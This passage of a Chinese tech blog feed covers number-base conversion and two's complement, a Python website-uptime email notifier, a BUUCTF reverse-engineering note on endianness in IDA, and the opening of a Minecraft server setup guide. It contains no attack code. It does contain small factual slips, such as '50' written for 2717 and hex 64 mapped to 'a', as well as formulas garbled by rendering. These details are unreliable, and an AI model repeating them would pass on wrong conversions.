tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2717÷16，商169余13，13对应十六进制为D</span><br><span class="line"> 169÷16，商 10余9</span><br><span class="line">  10÷16，商  0余10，10对应十六进制为A&lt;-商为0，停止</span><br><span class="line">  </span><br><span class="line">现在从上到下得到余数D9A，实际上的十六进制要从下往上倒过来，是A9D</span><br><span class="line">所以十进制50的十六进制是A9D</span><br></pre></td></tr></table></figure><h3 id="其他进制转换">其他进制转换</h3><p><s>实在不会一步转换就用十进制做跳板罢</s></p><h4 id="二进制与八进制">二进制与八进制</h4><h5 id="二进制—-八进制">二进制—&gt;八进制</h5><p>$$<br>2^3=8<br>$$</p><p>因为2和8的幂次关系，从右往左数每3位二进制可以找转换为一个八进制字符，最后不够的可以补0</p><p>二进制 10111001 转八进制：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">首先将 10111001 每三个划分一组</span><br><span class="line">10  111  001</span><br><span class="line">然后对每组分别计算</span><br></pre></td></tr></table></figure><p>对 10 计算：<br>$$<br>1<em>2^1 +0</em>2^0=2<br>$$<br>对 111 计算：<br>$$<br>1<em>2<sup>2+1*2</sup>1 +1</em>2^0=7<br>$$<br>对 001 计算：<br>$$<br>0<em>2<sup>2+0*2</sup>1+1</em>2^0=1<br>$$<br>组合起来八进制就是271</p><p>二进制 10111001 转八进制为 271</p><h5 id="八进制—-二进制">八进制—&gt;二进制</h5><p>将八进制数的每一位用三个二进制符号表示即可，这里单个数字可以用十进制转二进制时的算法八进制数512转二进制：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">5 —&gt; 5连除2得到余数逆序为101</span><br><span class="line">1 —&gt; 1连除2得到余数逆序为01，补0至三位即为001</span><br><span class="line">2 —&gt; 2连除2得到余数逆序为10，补0为010</span><br><span class="line"></span><br><span class="line">二进制即为101001010</span><br></pre></td></tr></table></figure><h4 id="二进制与十六进制">二进制与十六进制</h4><h5 id="二进制—-十六进制">二进制—&gt;十六进制</h5><p>$$<br>2^4=16<br>$$<br>因为2和16的幂次关系，从右往左数每4位二进制可以找转换为一个十六进制字符，最后不够的可以补0</p><p>计算过程和二进制转八进制非常相似</p><p>二进制 10111001 转十六进制：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">首先将 10111001 每四个划分一组</span><br><span class="line">1011  1001</span><br><span class="line">然后对每组分别计算</span><br></pre></td></tr></table></figure><p>$$<br>1<em>2<sup>3+0*2</sup>2+1</em>2<sup>1+1*2</sup>0=11（B）<br>$$</p><p>$$<br>1<em>2<sup>3+0*2</sup>2+0</em>2<sup>1+1*2</sup>0=9<br>$$</p><p>二进制 10111001 转十六进制为 B9</p><h5 id="十六进制—-二进制">十六进制—&gt;二进制</h5><p>类比八进制转二进制，十六进制每个字符要用四个二进制数表示</p><p>十六进制B9A转二进制</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">B —&gt; 11连除2，得到余数逆序1011</span><br><span class="line">9 —&gt; 9连除2，得到余数逆序1001</span><br><span class="line">A —&gt; 10连除2，得到余数逆序1010</span><br><span class="line"></span><br><span class="line">二进制即为101110011010</span><br></pre></td></tr></table></figure><h4 id="八进制和十六进制">八进制和十六进制</h4><p>用二进制或者十进制做桥梁</p><h2 id="原码、反码、补码">原码、反码、补码</h2><p>计算机通常使用二进制，原码、反码、补码是计算机中对的二进制表示方法</p><blockquote><p>原码：将最高位作为符号位（0表示正，1表示负），其它数字位代表数值本身的绝对值的数字表示方式。</p><p>反码：如果是正数，则表示方法和原码一样；如果是负数，符号位不变，其余各位取反，则得到这个数字的反码表示形式。</p><p>补码：如果是正数，则表示方法和原码一样；如果是负数，则将数字的反码加上1（相当于将原码数值位取反然后在最低位加1）。</p><p>正数的原码、反码、补码完全一样，只有负数需要按照以上规则计算</p></blockquote><h3 id="原码（Sign-Magnitude）">原码（Sign-Magnitude）</h3><p>原码是最简单的表示有符号整数的方式。它的规则很简单，即使用二进制表示数值的绝对值，最高位表示符号位（0表示正数，1表示负数）。例如，+5的原码为00000101，-5的原码为10000101。</p><p>原码的优点是直观简单，符号位可以直接判断正负。但是原码存在加减法运算时出现的溢出问题。</p><blockquote><p>扩展：原码为什么会有溢出问题</p><ol><li class="lvl-3"><p>符号位干扰。两个正数相加可能会因为进位问题导致符号位变化，从而产生错误的负数结果。</p><p>比如5的原码为0101，3的原码为0011，十进制相加后十进制为8，而二进制为1000，对应十进制为-8</p></li><li class="lvl-3"><p>表示范围有限。对于n位二进制数，能够表示的范围是-（2<sup>(n-1)-1）到2</sup>(n-1)-1。如果运算结果超出这个范围，就会发生溢出。</p></li></ol></blockquote><h3 id="反码（One’s-Complement）">反码（One’s Complement）</h3><p>为了解决原码的溢出问题，反码被提出。反码的规则是：正数的反码与原码相同，负数的反码是对该数的原码按位取反，将原码中的0变为1，1变为0。</p><p>例如，+5的反码仍为00000101，-5的反码为11111010。</p><p>反码解决了原码运算溢出的问题，但是存在“0”的两个表示（正0和负0），并且减法运算仍然存在一些问题。</p><blockquote><p>扩展：反码的减法问题</p><p>主要问题在于<strong>零的表示不唯一</strong>。在反码表示法中，零有两种表示形式：正零（所有位为0）和负零（符号位为1，其余位为0）</p><p>-5的反码为11111010，7的反码为00000111，7-5也就是7+(-5)，得到的二进制结果是00000001（+1）</p><p>因为反码中+0是0000000表示的，-0是11111111表示的，-0变为+0需要一个1，所以导致运算结果错误</p></blockquote><h3 id="补码（Two’s-Complement）">补码（Two’s Complement）</h3><p>为了进一步解决反码的问题，补码被引入。补码的规则是：正数的补码与原码相同，负数的补码是对该数的反码加1，这一步解决了反码中少1的问题。</p><p>例如，+5的补码仍为00000101，-5的补码为11111011。</p><h3 id="总结">总结</h3><p>通常使用补码来表示二进制负数，结合上述，表示二进制负数方法为：<strong>绝对值按位取反(每一位1变0，0变1)后最后一位加1</strong></p><h2 id="扩展内容">扩展内容</h2><h3 id="关于进制转换">关于进制转换</h3><p>小trick：windows计算器中的程序员模式能快速计算不同进制</p><p>也有很多在线工具能够快速计算 <a href="https://tool.lu/hexconvert/">进制转换 - 在线工具</a></p><h3 id="EXP（C-，二、八、十、十六进制转换）">EXP（C++，二、八、十、十六进制转换）</h3><p>输入格式：代转换数 当前进制 目标进制</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">to10</span><span class="params">(string s,<span class="type">int</span> k)</span></span>&#123;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> ans=<span class="number">0</span>,d=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i]&gt;=<span class="string">&#x27;A&#x27;</span>) ans=ans*k+(s[i]-<span class="string">&#x27;A&#x27;</span><span class="number">+10</span>);</span><br><span class="line"><span class="keyword">else</span> ans=ans*k+(s[i]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">d++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">from10</span><span class="params">(<span class="type">long</span> <span class="type">long</span> n,<span class="type">int</span> k)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">string b=<span class="string">&quot;0123456789ABCDEF&quot;</span>,ans;</span><br><span class="line"><span class="keyword">while</span>(n&gt;<span class="number">0</span>)&#123;</span><br><span class="line">ans+=b[n%k];</span><br><span class="line">n/=k;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">reverse</span>(ans.<span class="built_in">begin</span>(),ans.<span class="built_in">end</span>());</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> b,d;</span><br><span class="line">    string s;</span><br><span class="line">    cin&gt;&gt;s&gt;&gt;b&gt;&gt;d;</span><br><span class="line">    cout&lt;&lt;<span class="built_in">from10</span>(<span class="built_in">to10</span>(s,b),d);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过GET请求检查网站状况</title>
      <link href="/posts/1ab99abf.html"/>
      <url>/posts/1ab99abf.html</url>
      
        <content type="html"><![CDATA[<p>github 仓库: <a href="https://github.com/gubaiovo/check_web_is_online">gubaiovo/check_web_is_online: 使用 get 方法检查 web 在线，并通过邮箱提醒</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_email</span>(<span class="params">receiver, url, current_time, status_code</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置发件人信息</span></span><br><span class="line">    sender_email = <span class="string">&quot;aaa@aaa.com&quot;</span> <span class="comment"># 发件邮箱</span></span><br><span class="line">    password = <span class="string">&quot;xxxxxx&quot;</span>  <span class="comment"># 发件邮箱密码(授权码)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建邮件对象</span></span><br><span class="line">    message = MIMEMultipart()</span><br><span class="line">    message[<span class="string">&quot;From&quot;</span>] = sender_email</span><br><span class="line">    message[<span class="string">&quot;To&quot;</span>] = receiver</span><br><span class="line">    message[<span class="string">&quot;Subject&quot;</span>] = <span class="string">&quot;网站上线&quot;</span> <span class="comment"># 邮件主题</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 邮件正文</span></span><br><span class="line">    body = <span class="string">f&quot;网站 <span class="subst">&#123;url&#125;</span> 状态为 <span class="subst">&#123;status_code&#125;</span>，当前时间: <span class="subst">&#123;current_time&#125;</span>&quot;</span></span><br><span class="line">    message.attach(MIMEText(body, <span class="string">&quot;plain&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接到 SMTP 服务器并发送邮件</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 连接到 QQ 邮箱的 SMTP 服务器，根据不同邮箱具体设置</span></span><br><span class="line">        server = smtplib.SMTP(<span class="string">&quot;smtp.qq.com&quot;</span>, <span class="number">587</span>)</span><br><span class="line">        server.starttls()  <span class="comment"># 启用 TLS 加密</span></span><br><span class="line">        server.login(sender_email, password)  <span class="comment"># 登录 SMTP 服务器</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送邮件</span></span><br><span class="line">        server.sendmail(sender_email, receiver, message.as_string())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;邮件发送成功&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;邮件发送失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        server.quit()  <span class="comment"># 关闭连接</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkweb</span>(<span class="params">receiver, url</span>):</span><br><span class="line">    current_time = datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;网站正常 <span class="subst">&#123;url&#125;</span>，当前时间: <span class="subst">&#123;current_time&#125;</span>&quot;</span>)</span><br><span class="line">            send_email(receiver, url, current_time, response.status_code)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;网站异常<span class="subst">&#123;response.status_code&#125;</span>, 但是网站在线 <span class="subst">&#123;url&#125;</span>，当前时间: <span class="subst">&#123;current_time&#125;</span>&quot;</span>)</span><br><span class="line">            send_email(receiver, url, current_time, response.status_code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;网站连接失败 <span class="subst">&#123;e&#125;</span>，当前时间: <span class="subst">&#123;current_time&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_email</span>(<span class="params">email</span>):</span><br><span class="line">    pattern = <span class="string">r&#x27;^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> re.<span class="keyword">match</span>(pattern, email) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_url</span>(<span class="params">url</span>):</span><br><span class="line">    pattern = <span class="string">r&#x27;^(http|https)://[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> re.<span class="keyword">match</span>(pattern, url) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  ________        __________        .__</span></span><br><span class="line"><span class="string"> /  _____/ __ __  \______   \_____  |__|</span></span><br><span class="line"><span class="string">/   \  ___|  |  \  |    |  _/\__  \ |  |</span></span><br><span class="line"><span class="string">\    \_\  \  |  /  |    |   \ / __ \|  |</span></span><br><span class="line"><span class="string"> \______  /____/   |______  /(____  /__|</span></span><br><span class="line"><span class="string">        \/                \/      \/</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ctrl + c 退出程序&quot;</span>)</span><br><span class="line">time = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入检测间隔时间(秒): &quot;</span>))</span><br><span class="line">receiver = <span class="built_in">input</span>(<span class="string">&quot;请输入收件人邮箱: &quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> is_valid_email(receiver):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;邮箱格式不正确，请重新输入。&quot;</span>)</span><br><span class="line">    receiver = <span class="built_in">input</span>(<span class="string">&quot;请输入收件人邮箱: &quot;</span>)</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&quot;请输入网站地址(http/https不可省略): [ https(http)://www.example.com ]: &quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> is_valid_url(url):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;网站地址格式不正确，请重新输入。&quot;</span>)</span><br><span class="line">    url = <span class="built_in">input</span>(<span class="string">&quot;请输入网站地址(http/https不可省略): [ https(http)://www.example.com ]: &quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    checkweb(receiver, url)</span><br><span class="line">    sleep(time)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA 大小端序问题(BUUCTF SimpleRev)</title>
      <link href="/posts/f40c38f0.html"/>
      <url>/posts/f40c38f0.html</url>
      
        <content type="html"><![CDATA[<h1>IDA 大小端序问题(BUUCTF SimpleRev)</h1><p>在 BUUCTF 刷题时，遇到下面一个十六进制内容：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src[0] = 0x534C43444ELL;</span><br></pre></td></tr></table></figure><p>右键转换为字符后，内容如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src[0] = &#x27;SLCDN&#x27;;</span><br></pre></td></tr></table></figure><p>然后使用 <code>SLCDN</code> 发现解不出来题。后来查资料在知道涉及大小端序问题</p><h2 id="什么是大小端序？">什么是大小端序？</h2><p>大端（存储）模式，是指数据的低位保存在内存的高地址中，而数据的高位保存在内存的低地址中小端（存储）模式，是指数据的低位保存在内存的低地址中，而数据的高位保存在内存的高地址中</p><p>下面举个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>  a  =  <span class="number">0x12345678</span>；</span><br></pre></td></tr></table></figure><p>在十六进制中，高位在左边，低位在右边</p><p>int 占据的类型大小时 <strong>四个字节</strong>，a 从低位到高位分为 <code>78</code>，<code>56</code>，<code>34</code>，<code>12</code></p><p>一共四个字节的地址，假设从 0x1001 ~ 0x1004</p><p>![](/img-post/端序.png)</p><p>对于小端序，是这样存储的：</p><table><thead><tr><th>地址</th><th>存储内容</th></tr></thead><tbody><tr><td>0x1001</td><td>78</td></tr><tr><td>0x1002</td><td>56</td></tr><tr><td>0x1003</td><td>34</td></tr><tr><td>0x1004</td><td>12</td></tr></tbody></table><p>小端序**<em>数据的低位存储在低地址位，数据的高位存储在高地址位,小端字节序称为 LSB</em>**</p><p>对于大端序，是这样存储的：</p><table><thead><tr><th>地址</th><th>存储内容</th></tr></thead><tbody><tr><td>0x1001</td><td>12</td></tr><tr><td>0x1002</td><td>34</td></tr><tr><td>0x1003</td><td>56</td></tr><tr><td>0x1004</td><td>78</td></tr></tbody></table><p>大端序**<em>数据的低位存储在高地址位，数据的高位存储在低地址位,大端字节序称为 MSB</em>**</p><p>在网络编程中，计算机的 IP 地址，在系统中都是以大端字节序来存储的(网络字节序)，以确保不同系统之间的数据一致性。</p><p>数据在内存中具体按照小端序还是大端序，取决于架构：</p><ul class="lvl-0"><li class="lvl-2"><p><strong>小端序</strong>：x86、x86-64（Intel 和 AMD 处理器）等大多数现代桌面和服务器处理器使用小端序。</p></li><li class="lvl-2"><p><strong>大端序</strong>：一些网络协议和某些处理器（如早期的 PowerPC、SPARC）使用大端序。</p></li><li class="lvl-2"><p><strong>双端序（Bi-endian）</strong>：一些处理器（如 ARM、PowerPC）可以配置为使用小端序或大端序。</p></li></ul><h2 id="解题">解题</h2><p>die 查壳</p><blockquote><p>操作系统: Ubuntu Linux(ABI: 3.2.0)[AMD64, 64 位, DYN]</p></blockquote><p>所以内存在数据中应该是小端序，也就是数据的低位存储在低地址位，数据的高位存储在高地址位</p><p>IDA 中转换为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">src[0] = 0x534C43444ELL;</span><br><span class="line">src[0] = &#x27;SLCDN&#x27;;</span><br></pre></td></tr></table></figure><p>十六进制对应字符：</p><table><thead><tr><th>hex</th><th>char</th></tr></thead><tbody><tr><td>53</td><td>S</td></tr><tr><td>4c</td><td>L</td></tr><tr><td>43</td><td>C</td></tr><tr><td>44</td><td>D</td></tr><tr><td>4E</td><td>N</td></tr></tbody></table><p>IDA 将十六进制按照大端序转换为字符串，和小端序完全相反</p><p>所以正确解题需要将<code>SLCDN</code>反转为<code>NDCLS</code>。</p><h2 id="扩展">扩展</h2><p>在本题的反汇编中还发现了<code>v8[0] = 0x776F646168LL;</code></p><p>在 IDA 转化后为 <code>wodah</code></p><p>十六进制对应字符：</p><table><thead><tr><th>HEX</th><th>CHAR</th></tr></thead><tbody><tr><td>77</td><td>w</td></tr><tr><td>6F</td><td>o</td></tr><tr><td>64</td><td>d</td></tr><tr><td>64</td><td>a</td></tr><tr><td>68</td><td>h</td></tr></tbody></table><p>所以也是按照大端序转换的，使用时候也需要反转为 <code>hadow</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从0 → ∞ 成为 Minecraft JE腐竹</title>
      <link href="/posts/475edca7.html"/>
      <url>/posts/475edca7.html</url>
      
        <content type="html"><![CDATA[<h1>从 0 → ∞ 成为 Minecraft JE 腐竹</h1><blockquote><p>本文写于 2024.10.13 ，技术与时俱进，但是基础永恒不变。——顾白</p></blockquote><h2 id="前言">前言</h2><p>Minecraft 至今已经有 15 个年头了，15 年内优秀服务器不断涌现。已经 2024 年了，mc 服务器门槛已经相当的低。网络上虽然各种资料都有，但质量参差不齐。这篇教程将从头到尾介绍创建 mc java 服务器所有基础流程，已经我对 mc 服务器的一些看法。所以这篇教程会非常长<s>而且没有图片</s>。</p><blockquote><p>注意：不是所有联机情况都需要开服。如果只是一两个人联机，或者宿舍一起玩，那么局域网联机、联机 mod、内网穿透等联机方式就完全足够了</p></blockquote><blockquote><p>阅读本篇教程你需要准备的是：</p><ol><li class="lvl-3">能分辨问题的脑子，没断掉的且能自由活动的手，能感知光照的眼睛</li><li class="lvl-3">能联网的电脑</li><li class="lvl-3">一款好用的浏览器，推荐谷歌、edge</li><li class="lvl-3">会解压，有一款能用来解压的软件，比如 7-zip 等等</li><li class="lvl-3">打开隐藏目录和文件扩展名显示</li><li class="lvl-3">一款趁手的文本编辑器，如 vscode 等等</li><li class="lvl-3">初中英语水平，以及能够上网找翻译的能力</li><li class="lvl-3">不奢求开服赚米回本、敢于试错的心态</li><li class="lvl-3">敢于自主解决问题的心态</li><li class="lvl-4">耐心</li><li class="lvl-4">钱</li></ol></blockquote><p>基础教程不涉及 java 编程，其实大多数服主都没有编程基础。如果只是开个基友服，看完本篇教程绰绰有余</p><p>在开始之前，还是要说，这篇教程着重教的不是固定模板开服，那会失去自主探索的能力；也不是教某个 mod 或者插件具体怎么用，因为优质教程贴数不胜数。如果只是想找个整合包一键无脑开，那还请选择其他教程。</p><blockquote><p>授人以鱼不如授人以渔</p></blockquote><hr><h2 id="基础教程">基础教程</h2><h3 id="准备工作">准备工作</h3><h4 id="java-环境">java 环境</h4><p><a href="https://www.oracle.com/java/technologies/downloads/">Java Downloads</a></p><p>首先要明确的是，mc java 版是使用 java 语言开发的，java 版服务器也是基于 java 的。至于 java 语言是什么，零基础者只需要知道这是一个能跨平台(win、linux、mac os 等等)的编程语言即可。</p><p>既然是 java 语言开发的，那么就要配置一下 java 环境，不然有关 java 的都无法运行。</p><p>下面是 mc 各个版本对应的 java 版本。</p><table><thead><tr><th>mc 版本</th><th>java 版本</th></tr></thead><tbody><tr><td>1.12(17w13a)开始</td><td>java 8</td></tr><tr><td>1.17(21w19a)开始</td><td>java 16</td></tr><tr><td>1.18(1.18-pre2)开始</td><td>java 17</td></tr><tr><td>1.20.5(24w14a)开始</td><td>java 21</td></tr></tbody></table><p>根据想要开的服务器的版本选择 java 环境。</p><p>假设这里要开一个 1.21 的服务器，那么就需要下载 JDK 21。要开 1.12 的服务器，就需要 JDK 8</p><blockquote><p>这里可能会有疑惑，为什么我要把 java 写为 JDK，这涉及到 java 的几个版本问题。</p><p>实际上，Java 是一种编程语言，而 JDK（Java Development Kit）是用于开发 Java 应用程序的一套工具。</p><p>也许有了解过 java 的同学想问，为什么不安装 JRE。这就涉及到 JRE 和 JDK 的区别了</p><p>JDK 包括了编译器（javac）、解释器（java）、调试器（jdb）、文档生成工具（javadoc）等开发工具，以及 Java 运行环境（JRE）和 Java 基础类库（Java API）。</p><p>JRE 中包含了 Java 虚拟机（JVM）和 Java 标准类库，是运行 Java 程序所必需的环境。</p><p>换句话说，JDK 是 JRE plus，JRE 能实现的功能，JDK 都能实现。JRE 没有的功能 ，JDK 也能实现。如果有想要从事 Java 开发的同学，JDK 是刚需。所以果断装全面的，避免以后出现各种麻烦。</p></blockquote><p>注意：同一电脑可以安装多个版本 java。</p><p><strong>安装 java 过程要注意安装路径！一定要记住！</strong></p><p>下载有两种方案</p><ol><li class="lvl-3"><p>下载 exe 安装包，常规安装</p></li><li class="lvl-3"><p>下载 zip 压缩包，压缩包 <strong>解压</strong> 后包含所有安装内容</p></li></ol><p>两者实际上都可以。压缩包方便拷贝但是没有注册表，安装包一键安装有注册表。如果使用压缩包版本，一定要<strong>完整解压</strong>再使用！</p><p>在<strong>windows</strong>下安装完 JDK 后还需要配置环境变量，使终端能在任何位置下都能检测到 java。也可以不配置环境变量，但是需要在服务器启动程序中标注 java 路径。<a href="https://blog.csdn.net/xhmico/article/details/122390181">java 环境配置(详细教程)_java 环境配置-CSDN 博客</a></p><p>至于<strong>linux</strong>，可以参考这篇教程<a href="https://blog.csdn.net/weixin_43520670/article/details/106344655">Linux 配置 Java 环境（图文详细）_⑤ 配置 java 运行环境 linux-CSDN 博客</a></p><p>至于<strong>Mac OS</strong>，可以参考这篇教程<a href="https://blog.csdn.net/weixin_61536532/article/details/126791735">超详细的 Java 安装教程（Mac 版）_mac 安装 java-CSDN 博客</a></p><p><s>linux 比 windows 优化好多了，为什么不用 linux 开服呢？因为我当初不会 linux</s></p><p>至此你已经完成了 1/4</p><hr><h4 id="选择一个合适的服务器核心">选择一个合适的服务器核心</h4><p>推荐镜像站：<a href="https://www.fastmirror.net/#/download/">FastMirror.</a>(镜像站没有 fabric 核心)</p><p>服务器不会被 java 自己生出来的。</p><blockquote><p>什么是服务器核心？</p><p>服务端核心(简称核心，有时也被叫做服务端)是指开服时用于直接或间接启动 Minecraft 服务器的一类文件，文件名一般以 .jar 结尾。</p><p>换句话说，没有核心，就没有服务器</p></blockquote><p>选择一个合适自己的核心是很重要的。</p><p>目前服务器模式有：</p><ol><li class="lvl-3"><p>官服，纯原版，只支持数据包，这种属于官方核心：vanilla 核心(也被称为香草、官核)</p></li><li class="lvl-3"><p>纯 fabric / forge 模组服</p></li><li 